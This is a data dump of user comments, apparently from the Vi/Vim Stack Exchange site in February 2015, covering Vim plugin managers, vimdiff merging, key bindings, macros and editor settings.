  <row Id="743" PostId="199" Score="0" Text="Great answer! `:)` Sadly, every time we want to solve a problem with regex, we end up with two problems. `:)`" CreationDate="2015-02-09T09:48:15.787" UserId="106" />
  <row Id="744" PostId="628" Score="0" Text="@Doorknob Function was [renamed from &quot;start&quot; to &quot;insane in the membrane&quot;](https://github.com/mhinz/vim-startify/commit/c91cfb29aef9539987fbc438640633ba534d24a9) by Marco Hinz. Given [the original lyrics by Cypress Hill](http://www.lyricsmode.com/lyrics/c/cypress_hill/insane_in_the_brain.html) I'd guess he was worried about how big the method was getting. Or maybe was just listening to it at the time." CreationDate="2015-02-09T09:59:12.220" UserId="182" />
  <row Id="745" PostId="588" Score="0" Text="@Carpetsmoker are you looking for any font in particular?" CreationDate="2015-02-09T10:07:21.570" UserId="259" />
  <row Id="746" PostId="390" Score="1" Text="[vim-pandemic](https://github.com/jwcxz/vim-pandemic) is a nice addition to Pathogen. It handles the remote repositories behind the plugins, leaving Pathogen to handle the runtimepath. This does mean one needs two tools, but for disparate tasks which &quot;should&quot; be handled separately. The advantage of Pathogen + Pandemic that I found most convincing: there's no need to deal with git sub-modules for the bundles." CreationDate="2015-02-09T10:23:00.113" UserId="182" />
  <row Id="747" PostId="390" Score="0" Text="@jalanb Nice! I'll look into this an update when I can." CreationDate="2015-02-09T10:37:20.513" UserId="205" />
  <row Id="748" PostId="550" Score="0" Text="[vim-pandemic](https://github.com/jwcxz/vim-pandemic) is another way to enhance Pathogen without needing to use submodules. Pandemic handles the remote repositories leaving Pathogen to handle the runtimepath. This does mean one needs two tools, but for disparate tasks which &quot;should&quot; be handled separately." CreationDate="2015-02-09T10:43:01.287" UserId="182" />
  <row Id="749" PostId="588" Score="0" Text="@guillem No, not as such ..." CreationDate="2015-02-09T10:50:19.040" UserId="51" />
  <row Id="750" PostId="581" Score="0" Text="Yes, it does. Although I recommend a plugin manager to manage your plugins." CreationDate="2015-02-09T11:07:13.357" UserId="153" />
  <row Id="751" PostId="549" Score="2" Text="`:t` is the copy command. For `:tabedit` you need at least `:tabe`." CreationDate="2015-02-09T11:19:42.520" UserId="64" />
  <row Id="752" PostId="504" Score="0" Text="Note: it's not `&lt;C-6&gt;`, it's `&lt;C-^&gt;`. While on many terminal emulators there is no distinction, on some (including the one that ships with OS X), there is. For the latter case, the use of the `Shift` key is required (assuming Qwerty layout)." CreationDate="2015-02-09T11:55:33.430" UserId="64" />
  <row Id="753" PostId="504" Score="0" Text="@tommcdo interesting, I am on osx, but use iterm instead of the terminal.app, it works the same for me. Requiring Shift key on it would be a bummer." CreationDate="2015-02-09T12:18:19.000" UserId="74" />
  <row Id="754" PostId="622" Score="0" Text="It would appear that this is the correct answer. Thanks! I was apparently only copying the first character using `ctrl`+`v` when I should have been using `Shift`+`v`" CreationDate="2015-02-09T13:24:09.677" UserId="416" />
  <row Id="755" PostId="504" Score="0" Text="Come to think of it, it might just be that my OS is grabbing that key binding and not propagating it to Vim. My OS must be stopped!" CreationDate="2015-02-09T13:45:30.150" UserId="64" />
  <row Id="756" PostId="477" Score="0" Text="@Carpetsmoker I don't think the change list contains enough information to implement this feature, even if you could isolate the changes made in each session. It contains a single cursor position for each change, so you can't tell the extent of the edit that was made." CreationDate="2015-02-09T13:59:02.280" UserId="343" />
  <row Id="757" PostId="477" Score="0" Text="@Rich Yes, I came to the same conclusion..." CreationDate="2015-02-09T14:01:50.850" UserId="51" />
  <row Id="758" PostId="477" Score="0" Text="The undo list seems like a better candidate for getting the information required, but again, an awful lot of hackery would be required to actually get the desired functionality." CreationDate="2015-02-09T14:01:54.083" UserId="343" />
  <row Id="759" PostId="588" Score="1" Text="I wouldn't expect it to be supported because of the complexities. Kerning and associated issues like ligatures are hard enough to get right for normal programs, let alone one that assumes characters of a fixed block size." CreationDate="2015-02-09T14:23:09.413" UserId="205" />
  <row Id="760" PostId="542" Score="0" Text="This work nicely; I can open a scratch buffer with the previous revision diffed to the current with `:vsp new`, then `:read !git show HEAD~1:path` and finally `:windo diffthis` (and then using your solution)." CreationDate="2015-02-09T14:23:54.597" UserId="188" />
  <row Id="762" PostId="633" Score="0" Text="Is there a &quot;directory-changed&quot;-like event, while navigatin, which I could bind an autocommand to? Also, does it only work after opening a file?" CreationDate="2015-02-09T14:42:49.350" UserId="188" />
  <row Id="765" PostId="654" Score="5" Text="`ftdetect` is meant for detecting filetypes, use an `ftplugin` instead, there you don't need an `autocmd`, just use `setlocal` instead though." CreationDate="2015-02-09T15:00:41.843" UserId="74" />
  <row Id="766" PostId="398" Score="0" Text="I think this should be possible either by using an &quot;Region End&quot; offset to make the edges exclusive (see `:h :syn-pattern-offset`), or by changing the GitLog region to extend to the end of the file, and the Diff region to be entirely inside the GitLog region. I couldn't get either of these methods to work, though." CreationDate="2015-02-09T15:43:25.663" UserId="343" />
  <row Id="767" PostId="398" Score="0" Text="Testing it was made somewhat harder by the fact that--as you note--git.vim already highlights diff output. Might be an idea to alter your example accordingly!" CreationDate="2015-02-09T15:45:41.813" UserId="343" />
  <row Id="768" PostId="657" Score="3" Text="Not insert mode completions! You need `completeopt` for that." CreationDate="2015-02-09T16:28:44.173" UserId="343" />
  <row Id="769" PostId="633" Score="0" Text="@guido Not that I know of, but the other two answers seem like a possibility for automatic changing" CreationDate="2015-02-09T16:35:11.417" UserId="238" />
  <row Id="770" PostId="657" Score="0" Text="Thanks! wildmode and completeopt are exactly what I was looking for!" CreationDate="2015-02-09T16:44:33.507" UserId="227" />
  <row Id="772" PostId="618" Score="0" Text="While this answer does swap arguments, it doesn't answer the question, which is how to move the last argument to the beginning." CreationDate="2015-02-09T18:38:27.730" UserId="226" />
  <row Id="773" PostId="661" Score="1" Text="If you don't want to use or install Fugitive for some reason, you can also simply set `git config --global merge.tool vimdiff` and then run `git mergetool` to start vim in diff mode." CreationDate="2015-02-09T18:58:26.813" UserId="411" />
  <row Id="774" PostId="660" Score="0" Text="Have you ever given [Meld](http://meldmerge.org/) a try?" CreationDate="2015-02-09T19:02:22.313" UserId="416" />
  <row Id="775" PostId="618" Score="0" Text="@aharris88, you are right. I edited my answer." CreationDate="2015-02-09T19:30:32.760" UserId="356" />
  <row Id="776" PostId="661" Score="0" Text="Does this support the &quot;diff3&quot; style of merge conflicts, where the &quot;merged common ancestors&quot; is shown?" CreationDate="2015-02-09T19:39:24.923" UserId="67" />
  <row Id="777" PostId="660" Score="1" Text="@EricSabelhaus: Is it better than vimdiff at resolving conflicts? This site is about asking/answering questions about vim." CreationDate="2015-02-09T20:41:07.223" UserId="383" />
  <row Id="778" PostId="660" Score="0" Text="It depends on the use case I suppose. If I am working on code that lives remotely, I will most certainly use vimdiff. If I am working locally on my dev machine, I will use Meld, as it provides a feature rich UI to aid the developer in performing complex 3 way merges." CreationDate="2015-02-09T20:45:35.417" UserId="416" />
  <row Id="779" PostId="661" Score="0" Text="@alxndr: I had not heard of diff3 before. But after a quick google. The output of a merge conflict in git (and other source control I have used) is the same as a `diff3 -E`. So the images above are generated from files that have these markers in them." CreationDate="2015-02-09T20:48:25.440" UserId="383" />
  <row Id="780" PostId="660" Score="1" Text="@EricSabelhaus: To me the term `feature rich UI` is misleading; vimdiff may not have a nice UI it is definitely feature rich. I also find vim a much more productive environment that all GUI editors I have used (but I have used it for a long time and it was a steep learning curve). I more curious if Meld does anything that vim does not do that would make it worth while of even looking." CreationDate="2015-02-09T20:51:42.623" UserId="383" />
  <row Id="781" PostId="660" Score="0" Text="I cant specifically say whether it has a more robust feature set, but it is definitely in the same realm as vimdiff." CreationDate="2015-02-09T20:59:51.990" UserId="416" />
  <row Id="782" PostId="574" Score="4" Text="@JoshPetrie Not a duplicate, in my opinion.  This question is more general because there are other ways to indicate the lines are too long. (See the `gitcommit` syntax, for example, which uses syntax highlighting.)" CreationDate="2015-02-09T22:12:25.450" UserId="24" />
  <row Id="783" PostId="667" Score="0" Text="Actually, I'm using spaces to indent instead of tabs. I've updated my question." CreationDate="2015-02-09T22:23:51.403" UserId="226" />
  <row Id="784" PostId="667" Score="0" Text="Oh. Well then, that will require more research." CreationDate="2015-02-09T22:25:50.567" UserId="227" />
  <row Id="785" PostId="549" Score="0" Text="Oh dang, you're totally right. Thanks, I'll edit!" CreationDate="2015-02-09T23:05:53.590" UserId="163" />
  <row Id="786" PostId="667" Score="1" Text="There is a patch to make listchars work for non-trailing spaces, which you can dig up on the mailing list. It has not, however, been accepted into the official distribution :(" CreationDate="2015-02-09T23:52:04.893" UserId="72" />
  <row Id="787" PostId="670" Score="4" Text="Please take a look at our discussion of [plugin-link-only answers](http://meta.vi.stackexchange.com/questions/99/are-answers-offering-plugins-that-address-the-question-link-only-answers) and consider updating your answer with more information." CreationDate="2015-02-10T00:26:19.277" UserId="72" />
  <row Id="788" PostId="390" Score="1" Text="I use pathogen as my plugin loader. But I use git submodules to control the versions of the individual plugins. So its minimalist approach works well for my use case. How do the other managers handle version-ing and plugin updates." CreationDate="2015-02-10T00:40:52.893" UserId="383" />
  <row Id="789" PostId="667" Score="1" Text="Updated answer to include information from Vaibhav Sagar and Josh Petrie. I tried out the plugin Vaibhav mentioned and show the results in the edited answer. I think I'm going to start using this plugin myself. It's not fantastic, but in general seems to work pretty well." CreationDate="2015-02-10T02:11:11.263" UserId="227" />
  <row Id="790" PostId="648" Score="0" Text="Even without filetype-specific indent scripts, `'cindent'` has replaced the functionality of `'smartindent'`." CreationDate="2015-02-10T04:53:33.363" UserId="15" />
  <row Id="791" PostId="661" Score="0" Text="Now that I look closely, the first screenshot shows the diff3 style of merge; the middle top pane &quot;BASE&quot; is the common ancestor, which the left and right panes diverged from." CreationDate="2015-02-10T05:14:10.447" UserId="67" />
  <row Id="792" PostId="572" Score="2" Text="I'm voting to close this question as off-topic because it has nothing to do with text-editing using vim http://meta.vi.stackexchange.com/questions/157/why-was-how-much-money-has-been-raised-for-needy-children-in-uganda-from-vim-c/161#161" CreationDate="2015-02-10T05:18:01.253" UserId="188" />
  <row Id="793" PostId="51" Score="2" Text="Asynchronous tasks should mean no more blocking vim's interface to do work that could be in the background." CreationDate="2015-02-10T05:26:01.553" UserId="67" />
  <row Id="794" PostId="670" Score="0" Text="My mistake, I've updated my answer." CreationDate="2015-02-10T09:52:03.407" UserId="159" />
  <row Id="795" PostId="658" Score="1" Text="Personally I find the less consistent approach of `match`es better, as it highlights only those lines where I am exceeding the 80-column limit, rather than showing a (to me) intrusive big red line on the right of the screen. Hence in my vimrc for Python I use `call matchadd('ColorColumn', '\(\%80v\|\%100v\)')` (80 and 100 being the suggested lengths in PEP 8)" CreationDate="2015-02-10T09:54:34.357" UserId="182" />
  <row Id="796" PostId="662" Score="1" Text="I'm not aware of anything that achieves precisely what you're asking, but there's various fuzzy-file finders that allow you to open files in a similar way. I favour CtrlP, but there's also Command-T and I'm sure there's others I'm forgetting the name of." CreationDate="2015-02-10T09:56:41.727" UserId="343" />
  <row Id="797" PostId="662" Score="1" Text="@Rich As long as I don't have to mash Tab a dozen times, I'd be happy." CreationDate="2015-02-10T09:57:32.103" UserId="205" />
  <row Id="799" PostId="310" Score="0" Text="@muru I'd recommend checking out one of the buffer plugins that is mentioned in the &quot;Stop stop stop&quot; answer you linked to: they'll give you the visual indication you're looking for without trying to force Vim's tabs to work in a way they weren't designed." CreationDate="2015-02-10T10:17:15.877" UserId="343" />
  <row Id="802" PostId="501" Score="3" Text="`:previous` (or `:prev`) is the inverse of `:n`, and goes back a file." CreationDate="2015-02-10T11:12:11.173" UserId="343" />
  <row Id="803" PostId="626" Score="11" Text="You can also use the `:diffthis` command to initiate a diff when Vim is already running." CreationDate="2015-02-10T11:15:34.740" UserId="343" />
  <row Id="804" PostId="390" Score="0" Text="@LokiAstari Vundle and vim-plug have commands for updating plugins. Anything particular you were looking for?" CreationDate="2015-02-10T14:03:45.513" UserId="205" />
  <row Id="805" PostId="676" Score="1" Text="I'd also like to know this for `snake_case`" CreationDate="2015-02-10T14:14:54.463" UserId="51" />
  <row Id="806" PostId="676" Score="0" Text="You may be able to do something with the `iskeyword` setting, but I fear this will have many additional side-effects ... (see `:help word`)." CreationDate="2015-02-10T14:19:19.323" UserId="51" />
  <row Id="807" PostId="676" Score="0" Text="@Carpetsmoker I thought that it worked for `snake_case`. Seems that it doesn't, included it in the quesiton." CreationDate="2015-02-10T14:45:15.593" UserId="79" />
  <row Id="808" PostId="371" Score="0" Text="I've discovered a problem with this: if you open an encrypted file, and you don't want to open it (you forgot the password, wrong file), there's no way to quit! ^C doesn't work, and neither does anything else ... I had to kill Vim from another terminal :-/" CreationDate="2015-02-10T14:46:43.027" UserId="51" />
  <row Id="809" PostId="676" Score="4" Text="VimWiki's got you covered: http://vim.wikia.com/wiki/Moving_through_camel_case_words I'll write up a proper answer at some point if someone else doesn't beat me to it." CreationDate="2015-02-10T14:48:37.650" UserId="343" />
  <row Id="810" PostId="628" Score="0" Text="Thanks for your answer! But I don't think that this snippet is really an &quot;answer&quot;, as such. What do I put in the `insane_in_the_membrane` function? Do I need the  first 3 lines of this snippet? Or are they Startify-specific (what's `Session.vim`?), and the last line gives an error..." CreationDate="2015-02-10T16:01:15.533" UserId="51" />
  <row Id="811" PostId="675" Score="1" Text="`/u*/s*/m*/m*/&lt;Tab&gt;` is how I used to work around bash. It's not a substitute for zsh by a mile. `/usr/**/man&lt;Tab&gt;` is horrendously slow when you have the whole filesystem open, but might be useful for small projects. Unless I misunderstand `:b`, it's not for opening new files." CreationDate="2015-02-10T17:47:34.583" UserId="205" />
  <row Id="812" PostId="675" Score="0" Text="@muru you're right, it's not a substitute to zsh but it's still better than having to type the whole thing yourself, it's about making it easier, `**` is horrendously slow indeed, but works good for regular projects. `:b` is for existing open buffer, that's why using sessions helps." CreationDate="2015-02-10T17:56:15.363" UserId="74" />
  <row Id="813" PostId="668" Score="0" Text="Good! Thinking about it, I included in the list between `[` and `]` after the 9, the char `_` in order to consider as &quot;word&quot; identifiers like foo_bar" CreationDate="2015-02-10T20:43:25.190" UserId="311" />
  <row Id="814" PostId="677" Score="1" Text="Note that this plugin's default mappings shadow the `,` command (repeat last `f`/`t`/`F`/`T` motion), meaning if you want to use that command, you'll have to wait for a delay (configured by `'timeoutlen'`). Fortunately, the plugin allows you to use alternative mappings of your choosing." CreationDate="2015-02-10T22:44:54.627" UserId="64" />
  <row Id="815" PostId="667" Score="0" Text="Is it possible to get the guides to appear on blank lines like they do in sublime?" CreationDate="2015-02-10T22:53:06.287" UserId="462" />
  <row Id="816" PostId="677" Score="0" Text="There seem to be some side-effects with this plugin, ie: `dw` on `, key);` when cursor is at `k` seems to remove the entire line (including newline), while I expected just `key` to be removed..." CreationDate="2015-02-11T00:36:09.397" UserId="51" />
  <row Id="817" PostId="615" Score="0" Text="or `git submodule add` (instead of `git clone`)  if your vim configuration is already part of your own git project." CreationDate="2015-02-11T05:53:07.860" UserId="383" />
  <row Id="819" PostId="13" Score="0" Text="@Rich For example, typing `5j45|` on an emulated keyboard on a touchscreen has a *much* lower information rate (between your brain and your device) as touching the intended character position. On my opinion, a set of similar accelerations would be needed." CreationDate="2015-02-11T09:11:34.230" UserId="28" />
  <row Id="820" PostId="662" Score="0" Text="There is already [a similar question](http://stackoverflow.com/a/15583861/546861) on SO." CreationDate="2015-02-11T09:12:17.097" UserId="54" />
  <row Id="827" PostId="685" Score="1" Text="Thanks! Updated my answer to add the single-quote lines. (Working on the full fix)" CreationDate="2015-02-11T10:48:41.500" UserId="343" />
  <row Id="828" PostId="687" Score="0" Text="Additionally, you may or may not need to `set nocompatible` in your .vimrc file. It's generally good practice to set it unless you absolutely need vi compatibility." CreationDate="2015-02-11T11:08:03.727" UserId="306" />
  <row Id="830" PostId="357" Score="2" Text="Combine that with join &amp; range, and you can have a bunch of columns colored with very little code. My .vimrc has: `execute &quot;set colorcolumn=&quot; . join(range(81,335), ',')`" CreationDate="2015-02-11T11:11:07.043" UserId="306" />
  <row Id="831" PostId="688" Score="0" Text="`awk` is probably the tool for this job. But I'm on Windows (sigh)." CreationDate="2015-02-11T11:11:14.033" UserId="398" />
  <row Id="832" PostId="661" Score="1" Text="It's important to remember that each of these 4 views is just a buffer. This means you can open another tab (or even stay in the same window) and choose only the buffers you want to look at at any given moment. There's no reason to keep all 4 windows open at once if you're not using all of them." CreationDate="2015-02-11T11:15:10.937" UserId="306" />
  <row Id="833" PostId="688" Score="0" Text="Answered [here already](http://stackoverflow.com/questions/252766/add-line-numbers-to-source-code-in-vim), never mind :)" CreationDate="2015-02-11T11:20:15.457" UserId="398" />
  <row Id="836" PostId="191" Score="0" Text="E.g. `vim --startuptime timing.out usual_file.txt`" CreationDate="2015-02-11T11:41:01.810" UserId="467" />
  <row Id="837" PostId="691" Score="1" Text="Powerful stuff, I bow to your mastery. Macros are like black magic to me..." CreationDate="2015-02-11T12:09:58.160" UserId="398" />
  <row Id="843" PostId="691" Score="1" Text="@ropata, a macro is only a sequence of (mostly) normal mode commands." CreationDate="2015-02-11T13:37:15.153" UserId="54" />
  <row Id="844" PostId="649" Score="0" Text="Thanks! I've been using the `'.*\[.*\](.*)'` regexp for the last few days ... This is not a perfect solution, but it's certainly an improvement." CreationDate="2015-02-11T13:46:37.220" UserId="51" />
  <row Id="845" PostId="691" Score="1" Text="@romainl I think it's better to think of it as a sequence of *keystrokes*." CreationDate="2015-02-11T13:47:17.193" UserId="343" />
  <row Id="847" PostId="697" Score="2" Text="In VimScript files, the leading `:` is never necessary for commands." CreationDate="2015-02-11T13:54:48.717" UserId="64" />
  <row Id="848" PostId="697" Score="0" Text="@tommcdo Thanks. For some reason my brain forgets this sometimes &gt;_&lt;" CreationDate="2015-02-11T13:58:08.657" UserId="51" />
  <row Id="849" PostId="700" Score="1" Text="I realize that the asker is using gVim on Windows, so this solution probably won't work there. However, I think it still provides some opportunity for others to learn from it." CreationDate="2015-02-11T14:28:11.210" UserId="64" />
  <row Id="850" PostId="700" Score="0" Text="If you've installed `msysgit` and added that to your PATH (IIRC it's an install option), this solution should also work on Windows." CreationDate="2015-02-11T14:40:54.073" UserId="51" />
  <row Id="851" PostId="700" Score="4" Text="[`cat -n`](http://manpages.ubuntu.com/cat.1posix) is not POSIX, but [`nl`](http://manpages.ubuntu.com/nl.1posix) is, so it might be a better option." CreationDate="2015-02-11T14:43:39.730" UserId="205" />
  <row Id="852" PostId="705" Score="4" Text="Or `&lt;c-v&gt;009` in case of broken Tab key or hardcore ASCII purist :-)" CreationDate="2015-02-11T15:38:42.693" UserId="51" />
  <row Id="856" PostId="707" Score="0" Text="I am officially surprised! Upvoted." CreationDate="2015-02-11T17:55:01.550" UserId="343" />
  <row Id="861" PostId="711" Score="0" Text="This is also a good solution. The other question, which this is a duplicate of, has nice answers too." CreationDate="2015-02-11T20:31:07.387" UserDisplayName="user473" />
  <row Id="862" PostId="711" Score="1" Text="Yes, and mine doesn't quite fit there, that's why I answered here. :)" CreationDate="2015-02-11T20:31:34.093" UserId="205" />
  <row Id="863" PostId="711" Score="0" Text="Thanks. But I think you should add this answer to there too, because this question will be closed as a duplicate most probably. I think yours is a good alternative solution." CreationDate="2015-02-11T20:40:22.450" UserDisplayName="user473" />
  <row Id="864" PostId="565" Score="0" Text="I know it's off-topic, but I like this question." CreationDate="2015-02-11T20:45:57.170" UserDisplayName="user473" />
  <row Id="865" PostId="711" Score="1" Text="@purplehuman Closed questions will remain on the site, and can still be voted &amp; commented on. The only thing you *can't* do is add new answers." CreationDate="2015-02-11T20:51:50.573" UserId="51" />
  <row Id="866" PostId="711" Score="0" Text="@Carpetsmoker Ah, okay. Good to know. Thanks." CreationDate="2015-02-11T20:53:24.070" UserDisplayName="user473" />
  <row Id="867" PostId="566" Score="2" Text="http://www.vim.org spells it as `gVim` right in the front page in article." CreationDate="2015-02-11T20:54:42.290" UserId="205" />
  <row Id="868" PostId="543" Score="0" Text="Sorry if I sound ignorant. I'm kinda new. But isn't this off-topic? It seems like a git question rather than vi/vim." CreationDate="2015-02-11T21:04:02.787" UserDisplayName="user473" />
  <row Id="869" PostId="699" Score="0" Text="Thank you. After reading your answer I researched a bit and found that while in Insert mode `&lt;c-t&gt;` and `&lt;c-d&gt;` increase or decrease the indentation level. I tried `:h c-d` and I couldn't find more info, though... How could I read more about this on the vim documentation? I suggest you add a bit more info to your answer ;)" CreationDate="2015-02-11T21:16:55.630" UserId="356" />
  <row Id="870" PostId="691" Score="2" Text="@Rich, it can be a sequence of many things, including ex commands." CreationDate="2015-02-11T21:34:27.083" UserId="54" />
  <row Id="871" PostId="714" Score="0" Text="Thanks. Unfortunately I'm out of votes for 2 hours. :) I'll be back." CreationDate="2015-02-11T21:46:26.180" UserDisplayName="user473" />
  <row Id="872" PostId="714" Score="0" Text="All already listed in http://vi.stackexchange.com/a/125/205." CreationDate="2015-02-11T22:12:10.707" UserId="205" />
  <row Id="873" PostId="714" Score="0" Text="Yeah, that site and its questions are a joke." CreationDate="2015-02-11T22:17:51.803" UserId="54" />
  <row Id="874" PostId="718" Score="2" Text="`R` enters Replace Mode. `:help replace-mode` for more information." CreationDate="2015-02-12T00:55:57.290" UserId="67" />
  <row Id="876" PostId="718" Score="0" Text="I tried `vt.rgh`. But the result was the same as yours except for the cursor position." CreationDate="2015-02-12T01:17:13.363" UserId="356" />
  <row Id="877" PostId="719" Score="2" Text="This works for this case. What if you wanted to replace those 2 chars by say 3 chars?" CreationDate="2015-02-12T01:19:04.097" UserId="356" />
  <row Id="878" PostId="719" Score="0" Text="Good question; amended to include a way to handle different length text." CreationDate="2015-02-12T01:22:46.817" UserId="67" />
  <row Id="879" PostId="719" Score="0" Text="Yeah, I know that way. But that way you enter Insert mode and I was curious to see if there was a way not to use Insert mode in that case. Not that I think it very useful (and yet I could be wrong)." CreationDate="2015-02-12T01:26:07.783" UserId="356" />
  <row Id="880" PostId="720" Score="0" Text="I knew about `&lt;C-u&gt;` but I didn't know it could delete the tabs too. I have just tried it: `indent` is needed for it too work. I think this is quicker, as you wrote." CreationDate="2015-02-12T01:55:44.190" UserId="356" />
  <row Id="881" PostId="718" Score="2" Text="Why don't you want to enter insert mode? Something like `cwgh&lt;esc&gt;` would work fine." CreationDate="2015-02-12T02:07:17.370" UserId="88" />
  <row Id="882" PostId="626" Score="2" Text="And :diffoff to turn it off.&#xA;&#xA;I think a link to vim's documentation would be beneficial: http://vimdoc.sourceforge.net/htmldoc/diff.html" CreationDate="2015-02-12T04:49:25.010" UserId="306" />
  <row Id="884" PostId="691" Score="2" Text="@romainl Yes, that's why I think it's best to think of it as keystrokes. It plays back exactly what you type on the keyboard (including, as you say, ex commands), as if you had typed it all in manually." CreationDate="2015-02-12T09:46:35.707" UserId="343" />
  <row Id="885" PostId="708" Score="2" Text="I answered his question, but you've actually figured out what the underlying problem is way better than I did. Goodjob." CreationDate="2015-02-12T09:50:34.447" UserId="343" />
  <row Id="886" PostId="694" Score="1" Text="I like this answer because it doesn't require leaving Vim, which in my opinion is too expensive (my precious buffer list!). I have some notes: (1) leaving buffers without writing requires `'hidden'` to be set; (2) the `: update` command is a slight improvement over `:w` because it only writes if a change has been made, so `:bufdo update` or `:argdo update` will write all modified buffers or arguments." CreationDate="2015-02-12T11:10:45.743" UserId="64" />
  <row Id="887" PostId="694" Score="0" Text="Good point on `update`. I considered mentioning `hidden` when I was writing the answer, but decided against it because I didn't want to overcomplicate it. On reflection though, it should be in there. I'll update the answer to include both suggestions presently." CreationDate="2015-02-12T11:18:10.810" UserId="343" />
  <row Id="888" PostId="694" Score="0" Text="@tommcdo Just checked the documentation for :wall, and it only writes changed buffers, so :bufdo update is not necessary after all." CreationDate="2015-02-12T11:20:03.600" UserId="343" />
  <row Id="890" PostId="694" Score="0" Text="good catch regarding `:wall`, which also has the advantage of not cycling through buffers and moving you away from where you started. I suppose `:argdo update` is still a different story -- maybe you don't want to write to buffers that are not in your argument list." CreationDate="2015-02-12T11:44:34.250" UserId="64" />
  <row Id="891" PostId="694" Score="0" Text="@tommcdo Good point." CreationDate="2015-02-12T11:45:33.193" UserId="343" />
  <row Id="892" PostId="721" Score="0" Text="won't this place him in insert mode?" CreationDate="2015-02-12T12:00:15.650" UserId="342" />
  <row Id="893" PostId="718" Score="1" Text="@durron597 I'm not sure if `minimize-keystrokes` is a good tag, it's usually not really what the question is *about*, as such. (I rejected your proposed edits) ... Perhaps you should discuss at meta?" CreationDate="2015-02-12T13:47:17.870" UserId="51" />
  <row Id="895" PostId="721" Score="0" Text="Ah - didn't catch that part of his question. In that case, yes - R is the most appropriate solution." CreationDate="2015-02-12T15:53:47.210" UserId="306" />
  <row Id="896" PostId="730" Score="1" Text="`:help paste` gives you information on what it affects ... You usually want to enable this *only* for pasting;  ie: `nnoremap &lt;F12&gt; :set paste!&lt;CR&gt;` to toggle it with `F12`." CreationDate="2015-02-12T16:05:23.877" UserId="51" />
  <row Id="897" PostId="731" Score="0" Text="I am GNOME TERMINAL 3.8.4" CreationDate="2015-02-12T16:11:14.577" UserId="486" />
  <row Id="898" PostId="733" Score="3" Text="You can also use `-p` to open in tabs (FYI...)" CreationDate="2015-02-12T16:23:12.910" UserId="51" />
  <row Id="899" PostId="738" Score="4" Text="Using a `-` for stdin is pretty much standard for commandline tools;" CreationDate="2015-02-12T17:15:11.263" UserId="51" />
  <row Id="900" PostId="740" Score="4" Text="Note this will *won't* work in all shells. I think it will only work in `bash` and `zsh` (and not `sh`, `ksh`, `dash`, `fish`, `csh`, `tcsh`, etc.)" CreationDate="2015-02-12T17:17:12.837" UserId="51" />
  <row Id="901" PostId="734" Score="1" Text="Describing something as &quot;the right way&quot; without explaining why or providing a counter-example isn't helpful." CreationDate="2015-02-12T17:58:35.043" UserId="67" />
  <row Id="902" PostId="734" Score="1" Text="I agree with a @alxndr. First off, I do not have Ubuntu, which is stated in my question. Second, there is no context on how to use `&quot;*p`. Do I type it while in view mode? Or add to the `.vimrc`?" CreationDate="2015-02-12T18:23:14.483" UserId="486" />
  <row Id="903" PostId="740" Score="0" Text="@Carpetsmoker Should work in ksh88 and above, I think, but yes, process substitution is not POSIX." CreationDate="2015-02-12T18:41:26.540" UserId="205" />
  <row Id="904" PostId="734" Score="0" Text="@onebree it's like `p`, but for pasting from the OS clipboard. See http://vi.stackexchange.com/q/84/205" CreationDate="2015-02-12T18:44:42.900" UserId="205" />
  <row Id="905" PostId="734" Score="0" Text="Please define that in your answer then." CreationDate="2015-02-12T18:45:19.670" UserId="486" />
  <row Id="907" PostId="741" Score="0" Text="You can tell bash to use vi key bindings instead of emacs.  Use `set -o vi` to turn it on.  Then you can just use the `v` mapping in normal mode to edit the current command in your editor." CreationDate="2015-02-12T19:19:44.587" UserId="93" />
  <row Id="908" PostId="717" Score="0" Text="Thanks very much. I was hoping there would be a better way or that someone had already forked NERDTree on Github to add such an option, but I'll modify my copy of NERDTree." CreationDate="2015-02-12T19:22:39.767" UserId="333" />
  <row Id="910" PostId="741" Score="1" Text="For sure this is a great trick to edit the command line using vi but there are at least two problems using this method to read text from stdin: 1. `shell-expand-line` remove newlines from the expanded text and 2. `edit-and-execute-command` try to execute the command written in the buffer, whatever it is saved or not, when you quit vi." CreationDate="2015-02-12T19:35:45.530" UserId="13" />
  <row Id="911" PostId="734" Score="0" Text="@onebree, no you never mention a distribution in your question." CreationDate="2015-02-12T19:45:04.767" UserId="54" />
  <row Id="912" PostId="740" Score="3" Text="And pay attention to not trick yourself! When you start Vim this way it opens a buffer for a file like `/proc/PID/fd/FD`. If you write the buffer and quit, Vim doesn't complain, but the file you have written to will be removed by the OS. Using `-` as the file name the opened buffer have no file associated with it so if you try to quit without (as long you don't use a bang command or similar) saving Vim will warn you." CreationDate="2015-02-12T19:48:20.737" UserId="13" />
  <row Id="913" PostId="734" Score="0" Text="Corrected that, thank you. I did with one edit, but removed it. I forget the reason... CentOS 7. Hope this helps." CreationDate="2015-02-12T19:49:53.503" UserId="486" />
  <row Id="914" PostId="730" Score="0" Text="Are you pasting while in Insert mode? In Normal mode I always get the indentation as in the yanked text, unless I paste with `]p`, which pastes and adjusts the indentation to be correct." CreationDate="2015-02-12T20:14:03.053" UserId="356" />
  <row Id="915" PostId="742" Score="1" Text="What is a full command? The `dt` is shown because it's the current operator pending. Once it's given a motion, it's no longer an operator pending. Suppose we went further, and did `dt.gU(gu)daw` or so. Is all of that &quot;one full command&quot;, or is it four full commands, or something else?" CreationDate="2015-02-12T20:19:55.600" UserId="130" />
  <row Id="916" PostId="742" Score="0" Text="@mixedmath for me that would count as 4 commands. The second paragraph of the answer tries to disambiguate what I mean." CreationDate="2015-02-12T20:24:09.250" UserId="356" />
  <row Id="917" PostId="742" Score="2" Text="From Vim's perspective, `dt.gU(` are 2 commands: `dt.`  and `gU(`.... So what you really want is show some sort of command history (Vim is already showing the &quot;full comamnds&quot;)." CreationDate="2015-02-12T20:35:16.377" UserId="51" />
  <row Id="920" PostId="743" Score="0" Text="Perhaps version specific. Works fine on 7.4.617, with `vim -u NONE`, and after `:set wc=&lt;Tab&gt;`, `:set path=$PWD/**`." CreationDate="2015-02-12T21:12:27.253" UserId="205" />
  <row Id="921" PostId="743" Score="0" Text="I will check, I also just noticed that the path is changing when I visit a file.. Is there a way to keep the path at what I was when I opened vim?" CreationDate="2015-02-12T21:13:44.237" UserId="489" />
  <row Id="922" PostId="743" Score="1" Text="Perhaps a plugin? My `path` remains the same." CreationDate="2015-02-12T21:16:06.130" UserId="205" />
  <row Id="923" PostId="743" Score="0" Text="It's definitely `vim-classpath`.. Will confirm." CreationDate="2015-02-12T21:16:59.843" UserId="489" />
  <row Id="926" PostId="741" Score="0" Text="Woah, this is awesome. I learn a new thing about readline every day, it seems..." CreationDate="2015-02-12T21:48:32.757" UserId="88" />
